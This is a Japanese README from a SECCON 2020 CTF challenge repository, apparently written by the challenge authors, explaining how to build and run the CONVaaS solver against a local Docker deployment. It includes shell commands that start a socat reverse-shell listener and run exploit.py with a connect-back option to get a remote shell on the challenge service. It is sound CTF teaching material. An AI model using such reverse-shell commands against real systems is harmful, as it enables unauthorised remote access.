# CONVaaS の解答検証手順

本ドキュメントでは CONVaaS のソルバによる検証方法について述べます。なお、既に [CONVaaS の起動方法](../build/README.md) の手順どおりにサービスが起動されていることを前提とします。

## ソルバの Docker イメージのビルド方法

下記の手順で exploit を含む Docker イメージをビルドできます。

1. `docker build` コマンドで Docker イメージをビルドする。

    ```sh
    docker build -t seccon-2020-online-ctf-convaas-solver .
    ```

## ソルバによるフラグの確認方法

下記の手順で CONVaaS のフラグを確認できます。

1. `docker run` コマンドでソルバを実行する。

    ```sh
    container_name=$(docker container ls --filter=name=proxy --format='{{.Names}}')
    default_network=$(docker container inspect --format='{{range $k, $v := .NetworkSettings.Networks}}{{if (eq (index (split $k "_") 1) "default")}}{{$k}}{{end}}{{end}}' "${container_name}")
    seccon_host=$(docker container inspect --format='{{.NetworkSettings.Networks.'"${default_network}"'.IPAddress}}' "${container_name}")
    seccon_port=$((0xd0c0))
    docker run --rm --network="${default_network}" -e SECCON_HOST="${seccon_host}" -e SECCON_PORT="${seccon_port}" seccon-2020-online-ctf-convaas-solver
    ```

## ソルバによるリバースシェルの確立方法

下記の手順でリバースシェルを開くことができます。

1. リバースシェル用のターミナルを開いて `stty` コマンドで端末の状態を調整し、 `socat` コマンドでリバースシェルを待つ。

    ```sh
    container_name=$(docker container ls --filter=name=proxy --format='{{.Names}}')
    default_network=$(docker container inspect --format='{{range $k, $v := .NetworkSettings.Networks}}{{if (eq (index (split $k "_") 1) "default")}}{{$k}}{{end}}{{end}}' "${container_name}")
    lhost=$(docker container inspect --format='{{.NetworkSettings.Networks.'"${default_network}"'.Gateway}}' "${container_name}")
    lport=1337
    stty raw -echo && exec socat tcp-listen:"${lport}",reuseaddr,fork,bind="${lhost}" file:"$(tty)",raw,unlink-close=0
    ```

2. 新しくターミナルを開き、 `docker run` コマンドで --connect-back オプション付きで exploit.py を実行する。

    ```sh
    container_name=$(docker container ls --filter=name=proxy --format='{{.Names}}')
    default_network=$(docker container inspect --format='{{range $k, $v := .NetworkSettings.Networks}}{{if (eq (index (split $k "_") 1) "default")}}{{$k}}{{end}}{{end}}' "${container_name}")
    lhost=$(docker container inspect --format='{{.NetworkSettings.Networks.'"${default_network}"'.Gateway}}' "${container_name}")
    lport=1337
    seccon_host=$(docker container inspect --format='{{.NetworkSettings.Networks.'"${default_network}"'.IPAddress}}' "${container_name}")
    seccon_port=$((0xd0c0))
    docker run --rm --network="${default_network}" -e SECCON_HOST="${seccon_host}" -e SECCON_PORT="${seccon_port}" seccon-2020-online-ctf-convaas-solver python exploit.py --connect-back "${lhost}":"${lport}"
    ```
